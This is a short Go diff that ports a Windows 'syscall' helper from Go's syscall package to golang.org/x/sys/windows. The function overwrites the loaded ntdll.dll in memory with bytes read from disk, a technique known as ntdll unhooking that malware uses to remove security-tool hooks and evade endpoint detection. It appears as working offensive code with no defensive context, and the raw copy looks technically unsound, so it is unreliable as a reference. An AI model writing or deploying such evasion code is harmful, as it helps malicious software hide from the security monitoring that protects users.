@@ -1,8 +1,10 @@
+//go:build windows
+
 package syscall
 
 import (
+"golang.org/x/sys/windows"
 "os"
-"syscall"
 "unsafe"
 )
 
@@ -19,19 +21,15 @@ if err != nil {
 return err
 }
 
-ntdll, err := syscall.LoadDLL("ntdll.dll")
+ntdll, err := windows.LoadDLL("ntdll.dll")
 if err != nil {
 return err
 }
 
-// Get the base address of ntdll in memory
 ntdllBase := ntdll.Handle
-
-// Copy clean ntdll from disk to memory
 ntdllData := (*[1 << 30]byte)(unsafe.Pointer(ntdllBase))
 for i := 0; i < len(data); i++ {
 ntdllData[i] = data[i]
 }
-
 return nil
 }
